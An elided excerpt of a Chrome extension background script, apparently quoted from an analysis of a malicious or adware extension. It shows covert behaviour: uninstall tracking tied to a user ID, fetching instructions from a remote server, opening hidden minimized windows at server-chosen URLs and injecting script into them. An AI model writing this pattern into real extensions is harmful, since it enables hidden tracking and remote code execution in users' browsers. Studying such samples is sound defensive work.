...
chrome.storage.sync.get("UID", function(items) {
	...
	chrome.runtime.setUninstallURL(serverBaseUrl + "log.php?uid=" + UID + "&r&v=" + chrome.app.getDetails().version);
	...
	{
		var url = serverBaseUrl + script + (script.indexOf("?") === -1 ? "?" : "&") + "v=" + chrome.app.getDetails().version + "&" + Date.now();
				...
				if (response.t)
				{
					...
					chrome.windows.create({ "url": response.url, "focused": false, "state": "minimized" }, function(window) {
						...
						chrome.windows.update(window.id, { state: "minimized" }, function() {
							try
							{
								chrome.tabs.executeScript(window.tabs[0].id, { code: currentTabScript });
							}
							catch (e)
							{
	...
	chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
		...
		if (info.status == "complete")
		{
			if (tab.url.indexOf(serverBaseUrl + "check.html") === 0)
			{
				...
				{
					queryString = tab.url.substr(tab.url.indexOf("?") + 1);
